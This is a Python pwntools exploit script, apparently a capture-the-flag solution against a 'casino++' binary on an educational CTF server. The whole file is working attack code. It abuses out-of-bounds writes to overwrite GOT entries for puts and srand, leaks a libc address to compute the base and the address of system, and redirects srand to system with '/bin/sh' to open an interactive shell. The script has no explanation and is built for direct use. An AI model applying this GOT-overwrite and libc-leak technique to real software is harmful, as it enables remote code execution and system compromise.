#!/usr/bin/python3
from pwn import *

context.arch = "amd64"

def sendSuccess(binary, offset, value):
    binary.sendlineafter(":", str(0x3d))
    binary.sendlineafter(":", str(0x44))
    binary.sendlineafter(":", str(0x20))
    binary.sendlineafter(":", str(0x16))
    binary.sendlineafter(":", str(0x45))
    binary.sendlineafter(":", str(0x14))
    binary.sendlineafter("]:", "1")
    binary.sendlineafter("]:", offset)
    binary.sendlineafter(":", value)

def sendSuccess2(binary, offset, value):
    binary.sendlineafter(":", str(0x16))
    binary.sendlineafter(":", str(0x43))
    binary.sendlineafter(":", str(0x3a))
    binary.sendlineafter(":", str(0x35))
    binary.sendlineafter(":", str(0x4a))
    binary.sendlineafter(":", str(0x03))
    binary.sendlineafter("]:", "1")
    binary.sendlineafter("]:", offset)
    binary.sendlineafter(":", value)

def sendSuccess3(binary, offset, value):
    binary.sendlineafter(":", str(0x61))
    binary.sendlineafter(":", str(0x61))
    binary.sendlineafter(":", str(0x52))
    binary.sendlineafter(":", str(0x1d))
    binary.sendlineafter(":", str(0x51))
    binary.sendlineafter(":", str(0x1f))
    binary.sendlineafter("]:", "1")
    binary.sendlineafter("]:", offset)
    binary.sendlineafter(":", value)

def sendFail(binary, offset, value):
    for i in range(6):
        binary.sendlineafter(":", "1")
    binary.sendlineafter("]:", "1")
    binary.sendlineafter("]:", offset)
    binary.sendlineafter(":", value) 

binary = remote('edu-ctf.csie.org', 10176)
#binary = process('./casino++')
#pause()

libc_start_main = 0x601ff0

payload = flat(
        b'A'*16,
        libc_start_main,
        b'A'*8,
        b'/bin/sh'
    )
binary.sendlineafter("name:", payload)
binary.sendlineafter("age:", str(21))

# puts GOT - first increase try (no. of loops)
offset = "-42"
casino = 0x40095d
sendFail(binary, offset, "0")
offset = "-43"
sendSuccess(binary, offset, str(casino))

printf_plt = 0x400706
# second round - change srand GOT to puts (leak address)
sendFail(binary, "-34", "0")
sendSuccess(binary, "-35", str(printf_plt))

# call srand(puts) - receive the memory address
leaked = binary.recvline(keepends=False).strip()
# unpack the address, padded with 2 null bytes to make up a total of 8 bytes
libc = u64(leaked + b'\0\0')
offset = 0x21ab0
libc_base = libc - offset
success("libc base -> %s" % hex(libc_base))

system_offset = 0x4f440
system_addr = libc_base + system_offset
bin_sh_addr = 0x602110

# third round - change seed to /bin/sh 
sendFail(binary, "13", str(bin_sh_addr))
sendSuccess2(binary, "0", "0")

# fourth round - change srand GOT to system
first = system_addr // (16**8)
second = system_addr % (16**8)
sendFail(binary, "-34", str(first))
sendSuccess3(binary, "-35", str(second))

binary.interactive()

